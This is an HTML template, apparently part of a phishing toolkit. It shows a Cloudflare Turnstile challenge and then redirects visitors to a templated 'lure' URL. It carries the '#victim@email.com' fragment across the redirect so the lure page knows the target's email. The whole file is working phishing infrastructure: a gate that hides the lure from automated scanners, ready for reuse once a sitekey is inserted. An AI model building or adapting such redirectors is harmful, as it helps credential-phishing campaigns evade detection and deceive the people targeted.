<html>
<head>
    <title>Turnstile Redirector Demo</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
</head>
<body>

Loading...
<div id="cf-turnstile"></div>

<script>
// Preserve URL fragment (e.g. #victim@email.com) across the Turnstile redirect —
// location.assign() does NOT carry the old fragment, so re-attach it explicitly.
function goWithFragment() {
    var dest = {lure_url_js};
    try {
        if (window.location.hash && dest.indexOf('#') === -1) {
            dest += window.location.hash;
        }
    } catch(e) {}
    window.location.assign(dest);
}
turnstile.ready(function () {
        turnstile.render('#cf-turnstile', {
            sitekey: '1x00000000000000000000BB', // replace this with your own sitekey
            callback: function(token) {
                goWithFragment();
            },
        });
    });
</script>
</body>
</html>
